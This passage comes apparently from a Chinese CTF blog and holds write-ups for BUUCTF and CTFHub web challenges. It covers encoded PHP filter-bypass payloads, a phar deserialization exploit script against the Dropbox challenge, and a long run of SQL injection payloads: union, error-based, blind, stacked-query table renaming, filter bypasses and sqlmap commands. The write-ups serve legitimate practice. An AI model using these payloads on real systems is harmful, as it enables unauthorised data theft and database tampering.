&#x2F;1nD3x.php?file&#x3D;%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%3b%62%61%73%65%36%34%2c%5a%47%56%69%64%56%39%6b%5a%57%4a%31%58%32%46%78%64%57%45%3d&amp;%64%65%62%75&#x3D;%61%71%75%61%5f%69%73%5f%63%75%74%65%0a&amp;%73%68%61%6e%61[]&#x3D;1&amp;%70%61%73%73%77%64[]&#x3D;2&amp;%66%6c%61%67%5b%61%72%67%5d&#x3D;%7d%72%65%71%75%69%72%65%28%62%61%73%65%36%34%5f%64%65%63%6f%64%65%28%63%6d%56%68%4d%57%5a%73%4e%47%63%75%63%47%68%77%29%29%3b%76%61%72%5f%64%75%6d%70%28%67%65%74%5f%64%65%66%69%6e%65%64%5f%76%61%72%73%28%29%29%3b%2f%2f&amp;%66%6c%61%67%5b%63%6f%64%65%5d&#x3D;%63%72%65%61%74%65%5f%66%75%6e%63%74%69%6f%6e POST: file&#x3D;1&amp;debu&#x3D;1&amp;shana[]&#x3D;1&amp;passwd[]&#x3D;1 还是不行，尝试伪协议读源码了只能 require(php://filter/read=convert.base64-encode/resource=rea1fl4g.php) 采用取反绕过过滤 GET: &#x2F;1nD3x.php?file&#x3D;%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%3b%62%61%73%65%36%34%2c%5a%47%56%69%64%56%39%6b%5a%57%4a%31%58%32%46%78%64%57%45%3d&amp;%64%65%62%75&#x3D;%61%71%75%61%5f%69%73%5f%63%75%74%65%0a&amp;%73%68%61%6e%61[]&#x3D;1&amp;%70%61%73%73%77%64[]&#x3D;2&amp;%66%6c%61%67%5b%61%72%67%5d&#x3D;&#125;require(~(%8f%97%8f%c5%d0%d0%99%96%93%8b%9a%8d%d0%8d%9a%9e%9b%c2%9c%90%91%89%9a%8d%8b%d1%9d%9e%8c%9a%c9%cb%d2%9a%91%9c%90%9b%9a%d0%8d%9a%8c%90%8a%8d%9c%9a%c2%8d%9a%9e%ce%99%93%cb%98%d1%8f%97%8f));&#x2F;&#x2F;&amp;%66%6c%61%67%5b%63%6f%64%65%5d&#x3D;%63%72%65%61%74%65%5f%66%75%6e%63%74%69%6f%6e &#x2F;&#x2F;这里不知道为什么把require也取反就没法用了 POST: file&#x3D;1&amp;debu&#x3D;1&amp;shana[]&#x3D;1&amp;passwd[]&#x3D;1 &#x2F;&#x2F; preg_match() 只能匹配字符串，数组得以绕过。 2020BJDCTF “EzPHP” +Y1ngCTF “Y1ng’s Baby Code” 官方writeup – 颖奇L&#39;Amore (gem-love.com) 原题用异或也可以，贴个脚本先，万一以后能用到 #Author: piCEBDC7 str_&#x3D; &#39;1flag.php&#39; str_&#x3D;list(str_) final&#x3D;&#39;&#39; for x in str_: print(hex(~ord(x)&amp;0xff)) final+&#x3D;hex(~ord(x)&amp;0xff) print(str_) final &#x3D; final.replace(&#39;0x&#39;,&#39;%&#39;) final+&#x3D;&#39;^&#39; for x in range(len(str_)): final+&#x3D;r&#39;%ff&#39; print(final) 取反脚本 &lt;? &#x2F;&#x2F;Author: 颖奇L&#39;Amore &#x2F;&#x2F;Blog: www.gem-love.com $a &#x3D; &quot;p h p : &#x2F; &#x2F; f i l t e r &#x2F; r e a d &#x3D; c o n v e r t . b a s e 6 4 - e n c o d e &#x2F; r e s o u r c e &#x3D; 1 f l a g . p h p&quot;; $arr1 &#x3D; explode(&#39; &#39;, $a); echo &quot;&lt;br&gt;~(&quot;; foreach ($arr1 as $key &#x3D;&gt; $value) &#123; echo &quot;%&quot;.bin2hex(~$value); &#125; echo &quot;)&lt;br&gt;&quot;; 用羽师傅那个也行 [CISCN2019 华北赛区 Day1 Web1]Dropbox知识点：phar的反序列化 传个jpg文件然后下载的时候抓包有个filename，这里可以实现任意文件读取 index.php &lt;?php session_start(); if (!isset($_SESSION[&#39;login&#39;])) &#123; header(&quot;Location: login.php&quot;); die(); &#125; ?&gt; &lt;?php include &quot;class.php&quot;; $a &#x3D; new FileList($_SESSION[&#39;sandbox&#39;]); $a-&gt;Name(); $a-&gt;Size(); ?&gt; download.php &lt;?php session_start(); if (!isset($_SESSION[&#39;login&#39;])) &#123; header(&quot;Location: login.php&quot;); die(); &#125; if (!isset($_POST[&#39;filename&#39;])) &#123; die(); &#125; include &quot;class.php&quot;; ini_set(&quot;open_basedir&quot;, getcwd() . &quot;:&#x2F;etc:&#x2F;tmp&quot;); chdir($_SESSION[&#39;sandbox&#39;]); $file &#x3D; new File(); $filename &#x3D; (string) $_POST[&#39;filename&#39;]; if (strlen($filename) &lt; 40 &amp;&amp; $file-&gt;open($filename) &amp;&amp; stristr($filename, &quot;flag&quot;) &#x3D;&#x3D;&#x3D; false) &#123; Header(&quot;Content-type: application&#x2F;octet-stream&quot;); Header(&quot;Content-Disposition: attachment; filename&#x3D;&quot; . basename($filename)); echo $file-&gt;close(); &#125; else &#123; echo &quot;File not exist&quot;; &#125; ?&gt; login.php &lt;?php session_start(); if (isset($_SESSION[&#39;login&#39;])) &#123; header(&quot;Location: index.php&quot;); die(); &#125; ?&gt; &lt;?php include &quot;class.php&quot;; if (isset($_GET[&#39;register&#39;])) &#123; echo &quot;&lt;script&gt;toast(&#39;注册成功&#39;, &#39;info&#39;);&lt;&#x2F;script&gt;&quot;; &#125; if (isset($_POST[&quot;username&quot;]) &amp;&amp; isset($_POST[&quot;password&quot;])) &#123; $u &#x3D; new User(); $username &#x3D; (string) $_POST[&quot;username&quot;]; $password &#x3D; (string) $_POST[&quot;password&quot;]; if (strlen($username) &lt; 20 &amp;&amp; $u-&gt;verify_user($username, $password)) &#123; $_SESSION[&#39;login&#39;] &#x3D; true; $_SESSION[&#39;username&#39;] &#x3D; htmlentities($username); $sandbox &#x3D; &quot;uploads&#x2F;&quot; . sha1($_SESSION[&#39;username&#39;] . &quot;sftUahRiTz&quot;) . &quot;&#x2F;&quot;; if (!is_dir($sandbox)) &#123; mkdir($sandbox); &#125; $_SESSION[&#39;sandbox&#39;] &#x3D; $sandbox; echo(&quot;&lt;script&gt;window.location.href&#x3D;&#39;index.php&#39;;&lt;&#x2F;script&gt;&quot;); die(); &#125; echo &quot;&lt;script&gt;toast(&#39;账号或密码错误&#39;, &#39;warning&#39;);&lt;&#x2F;script&gt;&quot;; &#125; ?&gt; class.php &lt;?php error_reporting(0); $dbaddr &#x3D; &quot;127.0.0.1&quot;; $dbuser &#x3D; &quot;root&quot;; $dbpass &#x3D; &quot;root&quot;; $dbname &#x3D; &quot;dropbox&quot;; $db &#x3D; new mysqli($dbaddr, $dbuser, $dbpass, $dbname); class User &#123; public $db; public function __construct() &#123; global $db; $this-&gt;db &#x3D; $db; &#125; public function user_exist($username) &#123; $stmt &#x3D; $this-&gt;db-&gt;prepare(&quot;SELECT &#96;username&#96; FROM &#96;users&#96; WHERE &#96;username&#96; &#x3D; ? LIMIT 1;&quot;); $stmt-&gt;bind_param(&quot;s&quot;, $username); $stmt-&gt;execute(); $stmt-&gt;store_result(); $count &#x3D; $stmt-&gt;num_rows; if ($count &#x3D;&#x3D;&#x3D; 0) &#123; return false; &#125; return true; &#125; public function add_user($username, $password) &#123; if ($this-&gt;user_exist($username)) &#123; return false; &#125; $password &#x3D; sha1($password . &quot;SiAchGHmFx&quot;); $stmt &#x3D; $this-&gt;db-&gt;prepare(&quot;INSERT INTO &#96;users&#96; (&#96;id&#96;, &#96;username&#96;, &#96;password&#96;) VALUES (NULL, ?, ?);&quot;); $stmt-&gt;bind_param(&quot;ss&quot;, $username, $password); $stmt-&gt;execute(); return true; &#125; public function verify_user($username, $password) &#123; if (!$this-&gt;user_exist($username)) &#123; return false; &#125; $password &#x3D; sha1($password . &quot;SiAchGHmFx&quot;); $stmt &#x3D; $this-&gt;db-&gt;prepare(&quot;SELECT &#96;password&#96; FROM &#96;users&#96; WHERE &#96;username&#96; &#x3D; ?;&quot;); $stmt-&gt;bind_param(&quot;s&quot;, $username); $stmt-&gt;execute(); $stmt-&gt;bind_result($expect); $stmt-&gt;fetch(); if (isset($expect) &amp;&amp; $expect &#x3D;&#x3D;&#x3D; $password) &#123; return true; &#125; return false; &#125; public function __destruct() &#123; $this-&gt;db-&gt;close(); &#125; &#125; class FileList &#123; private $files; private $results; private $funcs; public function __construct($path) &#123; $this-&gt;files &#x3D; array(); $this-&gt;results &#x3D; array(); $this-&gt;funcs &#x3D; array(); $filenames &#x3D; scandir($path); $key &#x3D; array_search(&quot;.&quot;, $filenames); unset($filenames[$key]); $key &#x3D; array_search(&quot;..&quot;, $filenames); unset($filenames[$key]); foreach ($filenames as $filename) &#123; $file &#x3D; new File(); $file-&gt;open($path . $filename); array_push($this-&gt;files, $file); $this-&gt;results[$file-&gt;name()] &#x3D; array(); &#125; &#125; public function __call($func, $args) &#123; array_push($this-&gt;funcs, $func); foreach ($this-&gt;files as $file) &#123; $this-&gt;results[$file-&gt;name()][$func] &#x3D; $file-&gt;$func(); &#125; &#125; public function __destruct() &#123; $table &#x3D; &#39;&lt;div id&#x3D;&quot;container&quot; class&#x3D;&quot;container&quot;&gt;&lt;div class&#x3D;&quot;table-responsive&quot;&gt;&lt;table id&#x3D;&quot;table&quot; class&#x3D;&quot;table table-bordered table-hover sm-font&quot;&gt;&#39;; $table .&#x3D; &#39;&lt;thead&gt;&lt;tr&gt;&#39;; foreach ($this-&gt;funcs as $func) &#123; $table .&#x3D; &#39;&lt;th scope&#x3D;&quot;col&quot; class&#x3D;&quot;text-center&quot;&gt;&#39; . htmlentities($func) . &#39;&lt;&#x2F;th&gt;&#39;; &#125; $table .&#x3D; &#39;&lt;th scope&#x3D;&quot;col&quot; class&#x3D;&quot;text-center&quot;&gt;Opt&lt;&#x2F;th&gt;&#39;; $table .&#x3D; &#39;&lt;&#x2F;thead&gt;&lt;tbody&gt;&#39;; foreach ($this-&gt;results as $filename &#x3D;&gt; $result) &#123; $table .&#x3D; &#39;&lt;tr&gt;&#39;; foreach ($result as $func &#x3D;&gt; $value) &#123; $table .&#x3D; &#39;&lt;td class&#x3D;&quot;text-center&quot;&gt;&#39; . htmlentities($value) . &#39;&lt;&#x2F;td&gt;&#39;; &#125; $table .&#x3D; &#39;&lt;td class&#x3D;&quot;text-center&quot; filename&#x3D;&quot;&#39; . htmlentities($filename) . &#39;&quot;&gt;&lt;a href&#x3D;&quot;#&quot; class&#x3D;&quot;download&quot;&gt;下载&lt;&#x2F;a&gt; &#x2F; &lt;a href&#x3D;&quot;#&quot; class&#x3D;&quot;delete&quot;&gt;删除&lt;&#x2F;a&gt;&lt;&#x2F;td&gt;&#39;; $table .&#x3D; &#39;&lt;&#x2F;tr&gt;&#39;; &#125; echo $table; &#125; &#125; class File &#123; public $filename; public function open($filename) &#123; $this-&gt;filename &#x3D; $filename; if (file_exists($filename) &amp;&amp; !is_dir($filename)) &#123; return true; &#125; else &#123; return false; &#125; &#125; public function name() &#123; return basename($this-&gt;filename); &#125; public function size() &#123; $size &#x3D; filesize($this-&gt;filename); $units &#x3D; array(&#39; B&#39;, &#39; KB&#39;, &#39; MB&#39;, &#39; GB&#39;, &#39; TB&#39;); for ($i &#x3D; 0; $size &gt;&#x3D; 1024 &amp;&amp; $i &lt; 4; $i++) $size &#x2F;&#x3D; 1024; return round($size, 2).$units[$i]; &#125; public function detele() &#123; unlink($this-&gt;filename); &#125; public function close() &#123; return file_get_contents($this-&gt;filename); &#125; &#125; ?&gt; delete.php &lt;?php session_start(); if (!isset($_SESSION[&#39;login&#39;])) &#123; header(&quot;Location: login.php&quot;); die(); &#125; if (!isset($_POST[&#39;filename&#39;])) &#123; die(); &#125; include &quot;class.php&quot;; chdir($_SESSION[&#39;sandbox&#39;]); $file &#x3D; new File(); $filename &#x3D; (string) $_POST[&#39;filename&#39;]; if (strlen($filename) &lt; 40 &amp;&amp; $file-&gt;open($filename)) &#123; $file-&gt;detele(); Header(&quot;Content-type: application&#x2F;json&quot;); $response &#x3D; array(&quot;success&quot; &#x3D;&gt; true, &quot;error&quot; &#x3D;&gt; &quot;&quot;); echo json_encode($response); &#125; else &#123; Header(&quot;Content-type: application&#x2F;json&quot;); $response &#x3D; array(&quot;success&quot; &#x3D;&gt; false, &quot;error&quot; &#x3D;&gt; &quot;File not exist&quot;); echo json_encode($response); &#125; ?&gt; phar反序列化利用条件： 1）phar文件要能够上传至服务器 2）要有可用的魔术方法为跳板 3）文件操作函数的参数可控，且:、/、phar等特殊字符没有被过滤 对于本题而言，第一条满足，第二条有一个魔术方法__call()和FileList类、User类的__destruct()，恐怕想不利用它们也不行，第三条后半部分没问题，前半部分则需要我们找一找。 既曰文件操作函数，就应该在本题的File类（至多也在FileList类）的方法中寻找，毕竟整个题目基本上都是在面向对象的基础上编程，对文件的操作也都是对File类的对象的操作， 我们看到，open()方法调用了file_exists()和is_dir()函数（注意name方法里的basename函数不算），size()方法调用了filesize()函数，delete()方法调用了unlink()函数，close()方法file_get_contents()函数。 我们前面提到了，本题要读取/flag.txt文件，故刚刚列举的这些函数中，虽然文件操作函数不少，可以用来触发反序列化，对读取文件有用的只有close()方法中的file_get_contents()函数这一个，所以我们可以对它分析， 这个时候，如果想不到__call()方法和__destruct()方法，基本上就可以放弃了，在phar题目里，魔术方法一般来讲是必须要用的， 这里我们看到，FileList的__call()方法语义简单，就是遍历files数组，对每一个file变量执行一次$func，然后将结果存进$results数组， 接下来的__destruct函数会将FileList对象的funcs变量和results数组中的内容以HTML表格的形式输出在index.php上（我们可以看到，index.php里创建了一个FileList对象，在脚本执行完毕后触发__destruct，则会输出该用户目录下的文件信息）， User对象的__destruct()方法， 无非就是 脚本执行完毕后，执行$db的close()的方法（来关闭数据库连接），但话说回来，没有括号里的话，这句话依然成立，而且这个&#39;close&#39;与File类中的close()方法同名。所以，当db的值为一个FileList对象时，User对象析构之时，会触发FileList-&gt;close()，但FileList里没有这个方法，于是调用_call函数，进而执行file_get_contents($filename)，读取了文件内容。整个链的结构也很简单清晰：在我们控制$db为一个FileList对象的情况下，$user-&gt;__destruct() =&gt; $db-&gt;close() =&gt; $db-&gt;__call(&#39;close&#39;) =&gt; $file-&gt;close() =&gt; $results=file_get_contents($filename) =&gt; FileList-&gt;__destruct()输出$result。 反序列化脚本 &lt;?php class User &#123; public $db; &#125; class File&#123; public $filename; public function __construct($name)&#123; $this-&gt;filename&#x3D;$name; &#125; &#125; class FileList &#123; private $files; public function __construct()&#123; $this-&gt;files&#x3D;array(new File(&#39;&#x2F;flag.txt&#39;)); &#125; &#125; $o &#x3D; new User(); $o-&gt;db &#x3D;new FileList(); @unlink(&quot;phar.phar&quot;); $phar &#x3D; new Phar(&quot;phar.phar&quot;); $phar-&gt;startBuffering(); $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); $phar-&gt;setMetadata($o); $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); $phar-&gt;stopBuffering(); ?&gt; 参考文章 [CISCN2019 华北赛区 Day1 Web1]Dropbox之愚见 - 简书 (jianshu.com) [(24条消息) 关于phar反序列化——BUUCTF-CISCN2019 华北赛区 Day1 Web1]Dropbox_silence1_的博客-CSDN博客_buuctf 反序列化","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://ethe448.github.io/tags/ctf/"}]},{"title":"sql题wp","slug":"buu-sql题wp","date":"2021-06-16T08:30:58.000Z","updated":"2022-03-28T08:19:39.337Z","comments":true,"path":"2021/06/16/buu-sql题wp/","link":"","permalink":"https://ethe448.github.io/2021/06/16/buu-sql%E9%A2%98wp/","excerpt":"sql好难.jpg","text":"sql好难.jpg [极客大挑战 2019]EasySQL 用户框里输入单引号出现报错，猜测为字符型注入 利用1&#39;or 1#注入得到flag [强网杯 2019]随便注先试一下万能密码 利用1‘ order by 可以试出该表中存在两个字段 接下来要用堆叠查询（利用分号执行多个sql语句） 尝试先查询数据库 成功。 再查询表名 看到有两个表，查询两个表中的字段 words表内存在两个字段 1919810931114514表内存在一个字段，flag在该表内。 （查询该表时表名要在反单引号内） 1&#39;;show columns from 1919810931114514# 所以可以猜测 内部查询语句类似 : select id, data from words where id = 所以要把words表改为word1，将flag所在的表表名改为words，然后将flag改名为id； payload：1&#39;;rename table words to word1;rename table 1919810931114514 to words; alert table words change flag id varchar(100);# 再用1’ or 1#注入 也可以把words表改为words，将flag所在的表表名改为words，再为其添加id列，并将flag改为data payload：1&#39;;rename table words to word1;rename table 1919810931114514 to words;alter table words add id int unsigned not Null auto_increment primary key; alert table words change flag data varchar(100);# 再将1提交可直接获得flag [SUCTF 2019]EasySQL进入后输入1有回显 输入1‘无回显猜测是数字型注入 用堆叠注入的方式 查到存在一个flag表，尝试查看里面的内容 大概是被过滤了，只好百度搜wp了 看到dalao能够猜出后端语句为select &quot;.$post[&#39;query&#39;].&quot;||flag from Flag （搜到一篇wp说原环境中存在源码泄露，所以能够知道这部分的sql语言，但是buu的环境里没有[BUUCTF SUCTF 2019] EasySQL_Senimo-CSDN博客） 解法一：输入*,1 由于||在MySQL中起或的作用，因此1||flag会返回1，也就变成了 select *,1 from Flag. 成功找到flag 如果查询的参数不存在，那就会创建一个临时的列，并且设置该列所有参数都是查询的参数。所以整个payload语句的意思就是查询所有数据，然后增加了一个临时列，结果看图，第一列是数据库中的数据，第二列是添加的临时列1 因此在查询的flag后还有一个值为1的临时列 解法二 把&quot;||&quot;变成字符串连接符，而不是或。这里涉及到mysql中sql_mode参数设置，设置sql_mode=pipes_as_concat字符就可以设置。 payload：1;set sql_mode=PIPES_AS_CONCAT;select 1 也能获得flag。 这是查询语句相当于select 1flag from Flag (不太懂为啥这样也能查出来，1flag是列名如果Flag表里没有这一列呢？？) [极客大挑战 2019]LoveSQL用到了联合查询 原理篇——sql注入2：联合查询注入 - 这太秃然了 - 博客园 (cnblogs.com) SQL注入之联合查询注入_selecthch的博客-CSDN博客_联合注入 参考一下 常规步骤 1. 判断注入点 2. 判断注入类型（数字型型or字符型） 3. 判断字段数 4. 判断回显位 5. 确定数据库名 6. 确定表名 7. 确定字段名 8. 拿到数据 1.判断注入点 ​ 在输入的用户名后添加单引号返回出错，猜测存在注入 2.判断注入类型 ​ 在用户名后输入1’ or 1#后成功进入，但还是没有拿到flag，因此继续尝试注入 3.判断字段数 ​ 当order by 4时出错，因此应有三个字段数 4.判断回显位 5。确定数据库名 ​ 为了获取所有数据库名，要利用group_concat()函数令其一次性显示出来 1&#39; union select 1,2,group_concat(database());# 6.确定表名 1&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database();# 【INFORMATION_SCHEMA 数据库】 是MySQL自带的，它提供了访问数据库 元数据 的方式。元数据是关于数据的数据，如数据库名或表名，列的数据类型，或访问权限等。 常用字段 字段 含义 Table_catalog 数据表登记目录 Table_schema 数据表所属的数据库名 Table_name 表名称 Table_type 表类型[system view|base table] Engine 使用的数据库引擎[MyISAM|CSV|InnoDB] Version 版本，默认值10 Row_format 行格式[Compact|Dynamic|Fixed] Table_rows 表里所存多少行数据 Avg_row_length 平均行长度 Data_length 数据长度 Max_data_length 最大数据长度 Index_length 索引长度 Data_free 空间碎片 Auto_increment 做自增主键的自动增量当前值 Create_time 表的创建时间 Update_time 表的更新时间 Check_time 表的检查时间 Table_collation 表的字符校验编码集 Checksum 校验和 Create_options 创建选项 Table_comment 表的注释、备注 确定字段名 猜测flag应该在l0ve1ysq1表中，因此查找该表内的字段名 1&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;l0ve1ysq1&#39;;# 8.拿到数据 查找这三列中的全部数据，利用group_concat(); 1&#39; union select 1,2,group_concat(id,username,password) from l0ve1ysq1#; 得到flag MySQL默认有“information_schema”的数据库，该库中有三个表名： 1、SCHEMATA：存储该用户创建的所有数据库的库名，记录库名的字段为SCHEMA_NAME。2、TABLES：存储该用户创建的所有数据库的库名和表名，记录库名和表名的字段为TABLE_SCHEMA和TABLE_NAME。3、COLUMNS：存储该用户创建的所有数据库的库名、表名和字段名，库名、表名和字段名为TABLE_SCHEMA、TABLE_NAME和COLUMN_NAME。 ctfhub—SQL 整数型注入输入1有回显 输入1 and 1=2无回显，既存在注入点，整数型注入 利用order by可知存在两个字段 利用联合查询查询数据库名称 再查找表名 flag应该就在flag表内，再查找字段名 最后得到flag ctfhub—SQL字符型注入利用order by判断字段数 输入-1&#39; union select 1,2#判断回显位置 查数据库名 查表名 查字段名 查flag -1&#39; union select 1,group_concat(flag) from flag# 感觉和整数型注入差不多 ctfhub—报错注入利用xpath语法错误来进行报错注入主要利用extractvalue和updatexml两个函数。 extractvalue() 函数原型：extractvalue(xml_document,Xpath_string) 正常语法：extractvalue(xml_document,Xpath_string); 第一个参数：xml_document是string格式，为xml文档对象的名称 第二个参数：Xpath_string是xpath格式的字符串 作用：从目标xml中返回包含所查询值的字符串 第二个参数 xml中的位置是可操作的地方，xml文档中查找字符位置是用 /xxx/xxx/xxx/…这种格式，如果我们写入其他格式，就会报错，并且会返回我们写入的非法格式内容，而这个非法的内容就是我们想要查询的内容 payload模板 &#39; and extractvalue(1,concat(0x7e,(select @@version),0x7e)) 0x7e=’~’ concat(‘a’,‘b’)=“ab” version()=@@version ‘~‘可以换成’#’、’$&#39;等不满足xpath格式的字符 extractvalue()能查询字符串的最大长度为32，如果我们想要的结果超过32，就要用substring()函数截取或limit分页，一次查看最多32位 返回结果不能超过一条 若超过则需再查询语句后添加limit x,1或用group_concat()函数 updatexml() updatexml()函数与extractvalue()类似，是更新xml文档的函数。 and 1=(updataxml(1,concat(0x7e,(sql_inject),0x7e),1)) flood() 原理还没看明白（ 先放个模板在这 1 Union select count(*),concat((查询语句),0x26,floor(rand(0)*2))x from information_schema.columns group by x; 题目： 利用extractvalue 输入单引号提示语法错误，输入and 1=1能正确查询，猜测为数字型，利用extractvalue函数爆库名 再爆表名 这里提示太长因此利用group_concat()函数 猜到flag再flag表内爆列名 最后查询内容 1 and extractvalue(1,concat(0x7e,(select flag from flag limit 0,1),0x7e)) 由于extractvalue函数只能显示32位字符，所以要利用substring函数进行分割 利用substring查看右边31位字符 最后可以拿到flag ctfhub{ff3bb0327849e1b9e0e6abfd} 利用updataxml函数 利用flood函数 ctfhub—布尔盲注只有出现数据提交正确和错误两种不同的页面（报错型至少语法错误会回显错误到页面上）或者无法使用联合查询。 步骤 用错误和正确两种反馈进行逐一试验，猜测出闭合 利用length来逐一测试字符串的长度 利用substr来逐一的测试，测试库名、表名、列名和其他数据 最后得到数据 函数 length() 返回字符串的长度 length(abc) 返回3，表示abc字符串长度为3 substr() 截取字符串 substr(abc,1,1) 返回a，从abc的第一位开始截取，步长为1 mid() 取出字符串的一部分值 mid(abc,1,1) 返回a，从abc的第一位开始取，步长为1， 与substr()用法一致 left() 取出字符串左边的几个数据 left(abc,1) 返回a left(abc,2) 返回ab right() 取出右边的几个数据 right(abc,1) 返回c right(abc,2) 返回bc ord() 与ascii() 返回一个字符的ascii码值 ascii(s) 返回114 hex() 返回16进制数 先猜数据库长度&gt;3时返回成功，&gt;4时返回失败可以得到数据库名长度为4 接下来利用substr和ascii函数猜名字 首字母ascii码大于114时返回成功，大于115时返回失败，可得到首字母的ascii码为115，为s 第二位同理可以得到ascii码值为113，为q 最后可得数据库名为sqli 再猜表名 1 and substr((select table_name from information_schema.tables where table_schema=&#39;sqli&#39; limit 0,1),1,1)=&#39;n&#39; （感觉这部分应该用bp抓包爆破更方便） 吧limit后的0改为1猜第二个表名 最后能得到有news和flag两个表 再猜字段 首字母ascii码为102，为f 同理能得到字段名为flag 最后爆内容 太多了，用bp爆破完感觉也很难找，估计用py写脚本会方便很多 用sqlmap： -u http://challenge-b896931f16bb5e67.sandbox.ctfhub.com:10800/?id=1 --dbs查库名 -u http://challenge-b896931f16bb5e67.sandbox.ctfhub.com:10800/?id=1 -D sqli --tables 查表名 -u http://challenge-b896931f16bb5e67.sandbox.ctfhub.com:10800/?id=1 -D sqli -T flag --columns查字段名 -u http://challenge-b896931f16bb5e67.sandbox.ctfhub.com:10800/?id=1 -D sqli -T flag -C flag --dump查值 ctfhub—时间盲注利用sleep函数进行盲注 若and之前的语句正确则成功执行sleep 能得到是数字型注入 接下来利用if语句进行注入是否成功的判断1 and if(查询语句,sleep(2),1) 若为真则执行sleep（2），若为假则执行1 接下来步骤与布尔盲注相似 猜数据库名（也可以利用ascii码来猜，但因为ctfhub的sql题名称都一样，就直接试字符了） 1 and if(substr(database(),1,1)=&#39;s&#39;,sleep(2),1)# 猜表的数量 1 and if((select count(table_name) from information_schema.tables where table_schema=database())=2,sleep(2),1)# 猜表名 1 and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;0,sleep(2),1)# 将limit后的0改为1再猜第二个表名 分别为news 和 flag 猜flag表内字段数量 1 and if((select count(column_name) from information_schema.columns where table_name=&#39;flag&#39;)=1,sleep(2),1)# 猜字段名 1 and if(ascii(substr((select column_name from information_schema.columns where table_name=&#39;flag&#39; limit 0,1),1,1))&gt;102,sleep(2),1)# 最终可以猜出字段名为flag 再猜内容 1 and if(ascii(substr((select flag from flag limit 0,1),1,1))&gt;99,sleep(2),1)# 这部分应该还是要用python或者sqlmap 过滤空格看题目就知道空格被过滤了，这里可以利用/**/注释符来替代空格，其他步骤和字符型注入一样 最后得到flag 贴个别人总结的过滤和绕过 SQL注入一些过滤及绕过总结_obsetear的博客-CSDN博客 [极客大挑战 2019]BabySQL看到界面提示存在过滤 输入1&#39; and 1=1# 1‘ or 1# 1&#39; and select 1 from 1#等语句根据返回的错误信息可以知道过滤了select or and union from by where 这里可以利用双写绕过，首先利用order by查字段数可以查到表内有三列 1&#39; oorrder bbyy 4;# 接下来可以利用联合查询 先看回显1&#39; ununionion selselectect 1,2,3;# 查库名1&#39; ununionion selselectect 1,2,database();# 查表名 1&#39; ununionion selselectect 1,2,(selselectect group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema=database());# flag应该在b4bsql表里，爆一下列名 1&#39; ununionion selselectect 1,2,(selselectect group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_name=&#39;b4bsql&#39;);# 最后爆内容1&#39; ununionion selselectect 1,2,(selselectect group_concat(id,username,passwoorrd) frfromom b4bsql);# [极客大挑战 2019]HardSQL试了一下，and union 空格 等于都被过滤了尝试了几种绕过姿势都没成功，看了下别人的wp说是报错注入 利用括号来去掉查询语句中的空格 先查库 0&#39;or(extractvalue(1,concat(0x7e,(database()),0x7e)))# 再查表 由于等于号也被过滤了，所以要用like admin&#39;or(extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where((table_schema)like(database()))),0x7e)))# 爆列名 admin&#39;or(extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where((table_name)like(&#39;H4rDsq1&#39;))),0x7e)))# 最后爆内容 admin&#39;or(extractvalue(1,concat(0x7e,(select(group_concat(id,username,password))from(H4rDsq1)),0x7e)))# flag{66f2f5cd-207d-4d50-87 由于extractvalue显示字符数的限制，要用substr函数对其进行分割 admin&#39;or(extractvalue(1,concat(0x7e,right((select(group_concat(id,username,password))from(H4rDsq1)),31),0x7e)))# cd-207d-4d50-87bd-d8b762ffce95} 最后拼一下得到flag flag{66f2f5cd-207d-4d50-87bd-d8b762ffce95} [SWPU2019]Web1进入后是个登录页面，注册个账号之后登录 可以知道注入点在广告位上 试一下可以知道or and #都被过滤了 因为过滤了＃号，所以要保证后面的单引号能闭合 0&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&amp;&amp;‘1’&#x3D;‘1 得到回显位置2，3. 因为or被过滤，且无法通过大小写和双写绕过，那么information_schema因为含有or，所以也没法使用。这里有两种方法可以绕过 SQL注入：限制条件下获取表名、无列名注入 - MustaphaMond - 博客园 (cnblogs.com) InnoDb引擎从MYSQL5.5.8开始，InnoDB成为其默认存储引擎。而在MYSQL5.6以上的版本中，inndb增加了innodb_index_stats和innodb_table_stats两张表，这两张表中都存储了数据库和其数据表的信息，但是没有存储列名。sys数据库在5.7以上的MYSQL中，新增了sys数据库，该库的基础数据来自information_schema和performance_chema，其本身不存储数据。可以通过其中的schema_auto_increment_columns来获取表名。 sys数据库需要root权限，而innoDb在mysql中默认关闭 限制：mysql ≥ 5.7版本 先查一下数据库版本 因此可以利用innoDb来查表名 系统Mysql库中存在两张与innodb相关的表：innodb_table_stats和innodb_index_stats。 所以可以通过查找这两个表取代information的作用 0&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,group_concat(table_name),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#x2F;**&#x2F;from&#x2F;**&#x2F;mysql.innodb_table_stats&#x2F;**&#x2F;where&#x2F;**&#x2F;database_name&#x3D;database()&amp;&amp;&#39;1&#39;&#x3D;&#39;1 或 0&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,group_concat(table_name),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#x2F;**&#x2F;from&#x2F;**&#x2F;mysql.innodb_index_stats&#x2F;**&#x2F;where&#x2F;**&#x2F;database_name&#x3D;database()&amp;&amp;&#39;1&#39;&#x3D;&#39;1 得到表名为ads和users 猜flag在users表内，进行无列名注入 无列名注入原理 无列名注入的原理就是在取别名的同时查询数据。通过无列名查询构造一个虚拟表，在构造此表的同时查询其中的数据。 表的列数也要一次次试 （不太懂为啥这里的列数不是22) CTF|mysql之无列名注入 - 知乎 (zhihu.com) [SWPU2019]Web1 - 王叹之 - 博客园 (cnblogs.com) 